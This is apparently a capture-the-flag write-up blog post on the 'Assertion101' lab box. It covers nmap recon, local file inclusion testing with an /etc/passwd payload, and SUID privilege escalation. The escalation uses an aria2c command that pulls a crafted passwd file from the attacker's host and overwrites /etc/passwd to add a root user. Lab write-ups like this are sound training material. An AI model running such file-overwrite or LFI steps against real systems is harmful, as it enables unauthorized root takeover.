
+++
title = "Assertion101"
date = 2024-11-03T10:24:00
draft = false
tags = ["LFI", "SUID exploitation"]
+++

Recon :


a quick rustscan to find open ports on the target

![Pasted image 20241024182502.png](/images/Pasted image 20241024182502.png)

Scanning : 
then a nmap scan for banner grabbing for the open ports

![Pasted image 20241024182934.png](/images/Pasted image 20241024182934.png)

```
# Nmap 7.94SVN scan initiated Thu Oct 24 18:25:45 2024 as: /usr/lib/nmap/nmap -p 22,80 -sCV -oN assertion.txt 192.168.170.94
Nmap scan report for 192.168.170.94
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:ce:aa:cc:02:de:a5:a3:58:5d:da:2b:ef:54:07:f9 (RSA)
|   256 9d:3f:df:16:7a:e1:59:58:84:4a:e3:29:8f:44:87:8d (ECDSA)
|_  256 87:b5:6f:f8:21:81:d3:3b:43:d0:40:81:c0:e3:69:89 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Assertion
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 24 18:25:54 2024 -- 1 IP address (1 host up) scanned in 8.80 seconds
```

Enumeration : 

From the nmap scan, we could deduce that Os runs Linux and specifically.

There is a apache web server running, would enumerate it.

The website is about fitness. 

![Pasted image 20241024203759.png](/images/Pasted image 20241024203759.png)




fuzzing for hidden endpoints 

![Pasted image 20241024203907.png](/images/Pasted image 20241024203907.png)

/pages shows this php files.

![Pasted image 20241024203723.png](/images/Pasted image 20241024203723.png)

From the main page, clicked on the about-us 

![Pasted image 20241024204155.png](/images/Pasted image 20241024204155.png)

Test for lfi 
![Pasted image 20241024204233.png](/images/Pasted image 20241024204233.png)

using payload of /etc/passwd,there is an error "file does not exist"

could try other payloads or automate it by fuzzing.. 

While manually trying different payloads and methologies, the box creator sends us messages.. 

Will continue testing..

Tried everything i knew but was futile, reading over stackoverflow, someone talked about this attack, 

simple detailed explanation on how it works.. 





![Pasted image 20241101164653.png](/images/Pasted image 20241101164653.png)

going 1 step from the html directory, the local.txt file 

![Pasted image 20241101170919.png](/images/Pasted image 20241101170919.png)

Next, to attempt privilege escalation to the user..

importing linpeas 

![Pasted image 20241101173401.png](/images/Pasted image 20241101173401.png)

There is unknown binary, will enumerate more..

![Pasted image 20241101173511.png](/images/Pasted image 20241101173511.png)

great

![Pasted image 20241103092231.png](/images/Pasted image 20241103092231.png)


the `/usr/bin/aria2c` executable, which is a command line download utility. We can use it to overwrite some important files. For example, we can use it to overwrite the root’s authorized_keys file.


It can be used read files as well or 

![Pasted image 20241103090035.png](/images/Pasted image 20241103090035.png)

read it normally.. 
![Pasted image 20241103101114.png](/images/Pasted image 20241103101114.png)


in this scenario, will copy the existing passwd file and add a new user with root rights and copy to the target to the /etc directory using the aria2c binary.

![Pasted image 20241103101150.png](/images/Pasted image 20241103101150.png)



```/usr/bin/aria2c -o passwd "http://192.168.45.219:8000/newpass" --allow-overwrite=true
```


![Pasted image 20241103100413.png](/images/Pasted image 20241103100413.png)

then switch user to Tom and enter the password (Password@973)

![Pasted image 20241103100632.png](/images/Pasted image 20241103100632.png)

got the last flag.. 

Thanks for reading..

